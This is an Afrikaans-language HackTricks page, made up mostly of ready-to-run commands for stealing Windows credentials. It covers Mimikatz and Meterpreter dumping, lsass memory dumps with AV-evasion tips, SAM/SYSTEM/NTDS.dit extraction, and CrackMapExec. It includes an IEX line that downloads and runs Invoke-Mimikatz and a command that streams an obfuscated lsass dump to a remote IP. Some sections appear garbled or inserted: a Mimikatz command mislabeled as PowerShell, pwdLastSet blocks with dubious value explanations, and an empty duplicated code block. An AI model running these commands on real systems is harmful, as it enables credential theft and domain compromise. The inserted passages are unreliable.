# Steel Windows Geloofsbriewe

<details>

<summary><strong>Leer AWS hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks geadverteer wil sien** of **HackTricks in PDF wil aflaai** Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks handelsware**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking truuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Geloofsbriewe Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Vind ander dinge wat Mimikatz kan doen op** [**hierdie bladsy**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Leer hier oor moontlike geloofsbriewe beskermings.**](credentials-protections.md) **Hierdie beskermings kan voorkom dat Mimikatz sommige geloofsbriewe onttrek.**

## Geloofsbriewe met Meterpreter

Gebruik die [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **wat** ek geskep het om **wagwoorde en hashes binne die slagoffer te soek**.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Omseil AV

### Procdump + Mimikatz

Aangesien **Procdump van** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'n wettige Microsoft-instrument is**, word dit nie deur Defender opgespoor nie.\
Jy kan hierdie instrument gebruik om die **lsass-proses te dump**, **laai die dump af** en **onttrek** die **bewyse plaaslik** van die dump.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extract credentials from the dump" %}

{% endcode %}

{% code title="Extract credentials from the dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Hierdie proses word outomaties gedoen met [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Sommige **AV** mag **opspoor** as **kwaadwillig** die gebruik van **procdump.exe om lsass.exe te dump**, dit is omdat hulle die string **"procdump.exe" en "lsass.exe"** **opspoor**. Dit is dus **stealthier** om as 'n **argument** die **PID** van lsass.exe aan procdump **oor te gee** in plaas van die **naam lsass.exe.**

### Dumping lsass met **comsvcs.dll**

'n DLL genaamd **comsvcs.dll** gevind in `C:\Windows\System32` is verantwoordelik vir **dumping process memory** in die geval van 'n ongeluk. Hierdie DLL sluit 'n **funksie** in genaamd **`MiniDumpW`**, ontwerp om gebruik te word met `rundll32.exe`.\
Dit is irrelevant om die eerste twee argumente te gebruik, maar die derde een is verdeel in drie komponente. Die proses-ID wat gedump moet word, vorm die eerste komponent, die dump-lêerligging verteenwoordig die tweede, en die derde komponent is streng die woord **full**. Geen alternatiewe opsies bestaan nie.\
Na die ontleding van hierdie drie komponente, is die DLL betrokke by die skep van die dump-lêer en die oordrag van die gespesifiseerde proses se geheue in hierdie lêer.\
Gebruik van die **comsvcs.dll** is haalbaar vir die dumping van die lsass-proses, wat die behoefte uitskakel om procdump op te laai en uit te voer. Hierdie metode word in detail beskryf by [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Die volgende bevel word gebruik vir uitvoering:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Jy kan hierdie proses outomatiseer met** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass met Task Manager**

1. Regskliek op die Task Bar en klik op Task Manager
2. Klik op More details
3. Soek vir "Local Security Authority Process" proses in die Processes tab
4. Regskliek op "Local Security Authority Process" proses en klik op "Create dump file".

### Dumping lsass met procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is 'n Microsoft-ondertekende binêr wat deel is van die [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass met PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is 'n Protected Process Dumper Tool wat geheue-dump obfuskeering ondersteun en dit na afgeleë werkstasies oordra sonder om dit op die skyf te laat val.

**Sleutelfunksionaliteite**:

1. Omseiling van PPL-beskerming
2. Obfuskeering van geheue-dump-lêers om Defender se handtekening-gebaseerde opsporingsmeganismes te ontduik
3. Oplaai van geheue-dump met RAW en SMB oplaai-metodes sonder om dit op die skyf te laat val (lêerlose dump)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets

LSA (Local Security Authority) geheime kan geloofsbriewe en sensitiewe inligting bevat wat gebruik kan word om toegang tot 'n stelsel te verkry. Om LSA geheime te dump, kan jy die volgende PowerShell-opdrag gebruik:

```powershell
sekurlsa::logonpasswords
```

Hierdie opdrag sal 'n lys van huidige aanmeldingsessies en hul gepaardgaande geloofsbriewe vertoon.
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump die NTDS.dit van teiken DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump die NTDS.dit wagwoordgeskiedenis van teiken DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Wys die pwdLastSet eienskap vir elke NTDS.dit rekening

```shell
dsquery * -s <DC IP> -d <domein> -b "DC=<domein>,DC=com" -filter "(&(objectCategory=person)(objectClass=user))" -attr samaccountname pwdLastSet
```

### Verander die pwdLastSet eienskap vir 'n rekening

```shell
# Verander die pwdLastSet eienskap vir 'n rekening
# 132456789000000000 = 2018-01-01
# 0 = vereis dat die gebruiker die wagwoord verander by volgende aanmelding
# -1 = wagwoord is nooit verstryk nie
# 9223372036854775807 = wagwoord is onmiddellik verstryk

dsmod user "CN=Gebruiker,CN=Users,DC=domein,DC=com" -pwdlastset 132456789000000000
```

### Verander die pwdLastSet eienskap vir alle rekeninge

```shell
# Verander die pwdLastSet eienskap vir alle rekeninge
# 132456789000000000 = 2018-01-01
# 0 = vereis dat die gebruiker die wagwoord verander by volgende aanmelding
# -1 = wagwoord is nooit verstryk nie
# 9223372036854775807 = wagwoord is onmiddellik verstryk

dsquery user -name * | dsmod user -pwdlastset 132456789000000000
```

### Verander die pwdLastSet eienskap vir alle rekeninge in 'n spesifieke OU

```shell
# Verander die pwdLastSet eienskap vir alle rekeninge in 'n spesifieke OU
# 132456789000000000 = 2018-01-01
# 0 = vereis dat die gebruiker die wagwoord verander by volgende aanmelding
# -1 = wagwoord is nooit verstryk nie
# 9223372036854775807 = wagwoord is onmiddellik verstryk

dsquery user "OU=SpesifiekeOU,DC=domein,DC=com" -name * | dsmod user -pwdlastset 132456789000000000
```
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Hierdie lêers moet **geleë** wees in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM._ Maar **jy kan hulle nie net op 'n gewone manier kopieer nie** omdat hulle beskerm is.

### Van Register

Die maklikste manier om daardie lêers te steel is om 'n kopie van die register te kry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Laai** daardie lêers af na jou Kali-masjien en **onttrek die hashes** deur gebruik te maak van:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Jy kan 'n kopie van beskermde lêers maak deur hierdie diens te gebruik. Jy moet 'n Administrateur wees.

#### Gebruik vssadmin

vssadmin binary is slegs beskikbaar in Windows Server weergawes
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Maar jy kan dieselfde doen vanaf **Powershell**. Dit is 'n voorbeeld van **hoe om die SAM-lêer te kopieer** (die hardeskyf wat gebruik word is "C:" en dit word gestoor na C:\users\Public) maar jy kan dit gebruik om enige beskermde lêer te kopieer:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Uiteindelik kan jy ook die [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) gebruik om 'n kopie van SAM, SYSTEM en ntds.dit te maak.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Geloofsbriewe - NTDS.dit**

Die **NTDS.dit**-lêer staan bekend as die hart van **Active Directory**, wat belangrike data oor gebruikersobjekte, groepe, en hul lidmaatskappe bevat. Dit is waar die **wagwoord-hashes** vir domeingebruikers gestoor word. Hierdie lêer is 'n **Extensible Storage Engine (ESE)** databasis en is geleë by **_%SystemRoom%/NTDS/ntds.dit_**.

Binne hierdie databasis word drie primêre tabelle onderhou:

- **Data Table**: Hierdie tabel is verantwoordelik vir die stoor van besonderhede oor objekte soos gebruikers en groepe.
- **Link Table**: Dit hou tred met verhoudings, soos groeplidmaatskappe.
- **SD Table**: **Sekuriteitsbeskrywings** vir elke objek word hier gehou, wat die sekuriteit en toegangsbeheer vir die gestoor objekte verseker.

Meer inligting hieroor: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows gebruik _Ntdsa.dll_ om met daardie lêer te kommunikeer en dit word gebruik deur _lsass.exe_. Dan kan **deel** van die **NTDS.dit**-lêer **binne die `lsass`**-geheue gevind word (jy kan die laaste toeganklike data vind waarskynlik as gevolg van die prestasieverbetering deur 'n **kas** te gebruik).

#### Ontsleuteling van die hashes binne NTDS.dit

Die hash is drie keer gesifreer:

1. Ontsleutel Wagwoord Enkripsie Sleutel (**PEK**) met behulp van die **BOOTKEY** en **RC4**.
2. Ontsleutel die **hash** met behulp van **PEK** en **RC4**.
3. Ontsleutel die **hash** met behulp van **DES**.

**PEK** het dieselfde waarde in **elke domeinbeheerder**, maar dit is **gesifreer** binne die **NTDS.dit**-lêer met behulp van die **BOOTKEY** van die **SYSTEM-lêer van die domeinbeheerder (is verskillend tussen domeinbeheerders)**. Dit is hoekom om die geloofsbriewe van die NTDS.dit-lêer te kry **jy die lêers NTDS.dit en SYSTEM nodig het** (_C:\Windows\System32\config\SYSTEM_).

### Kopieer NTDS.dit met behulp van Ntdsutil

Beskikbaar sedert Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Jy kan ook die [**volume shadow copy**](./#stealing-sam-and-system) truuk gebruik om die **ntds.dit** lêer te kopieer. Onthou dat jy ook 'n kopie van die **SYSTEM file** sal nodig hê (weer, [**dump dit van die register of gebruik die volume shadow copy**](./#stealing-sam-and-system) truuk).

### **Uittrek van hashes vanaf NTDS.dit**

Sodra jy die lêers **NTDS.dit** en **SYSTEM** **verkry het**, kan jy gereedskap soos _secretsdump.py_ gebruik om **die hashes uit te trek**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Jy kan hulle ook **outomaties onttrek** deur 'n geldige domein admin gebruiker te gebruik:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Vir **groot NTDS.dit lêers** word dit aanbeveel om dit uit te trek met [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Uiteindelik kan jy ook die **metasploit module** gebruik: _post/windows/gather/credentials/domain\_hashdump_ of **mimikatz** `lsadump::lsa /inject`

### **Uittrek van domeinobjekte vanaf NTDS.dit na 'n SQLite databasis**

NTDS-objekte kan na 'n SQLite databasis uitgetrek word met [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Nie net geheime word uitgetrek nie, maar ook die hele objekte en hul eienskappe vir verdere inligtingonttrekking wanneer die rou NTDS.dit lêer reeds verkry is.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Die `SYSTEM` hive is opsioneel maar laat toe vir geheime dekripsie (NT & LM hashes, aanvullende geloofsbriewe soos duidelik teks wagwoorde, kerberos of vertrou sleutels, NT & LM wagwoordgeskiedenisse). Saam met ander inligting, word die volgende data onttrek: gebruiker- en masjienrekeninge met hul hashes, UAC-vlae, tydstempel vir laaste aanmelding en wagwoordverandering, rekeninge beskrywing, name, UPN, SPN, groepe en herhalende lidmaatskappe, organisatoriese eenhede boom en lidmaatskap, vertroude domeine met vertroue tipe, rigting en eienskappe...

## Lazagne

Laai die uitvoerbare lêer af van [hier](https://github.com/AlessandroZ/LaZagne/releases). Jy kan hierdie uitvoerbare lêer gebruik om geloofsbriewe van verskeie sagteware te onttrek.
```
lazagne.exe all
```
## Ander gereedskap vir die onttrekking van geloofsbriewe vanaf SAM en LSASS

### Windows credentials Editor (WCE)

Hierdie hulpmiddel kan gebruik word om geloofsbriewe uit die geheue te onttrek. Laai dit af vanaf: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Onttrek geloofsbriewe vanaf die SAM-lêer
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Haal geloofsbriewe uit die SAM-lêer
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Laai dit af van: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) en **voer dit net uit** en die wagwoorde sal onttrek word.

## Verdedigings

[**Leer hier oor sommige geloofsbeskermings.**](credentials-protections.md)

<details>

<summary><strong>Leer AWS hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks geadverteer wil sien** of **HackTricks in PDF wil aflaai** Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking truuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
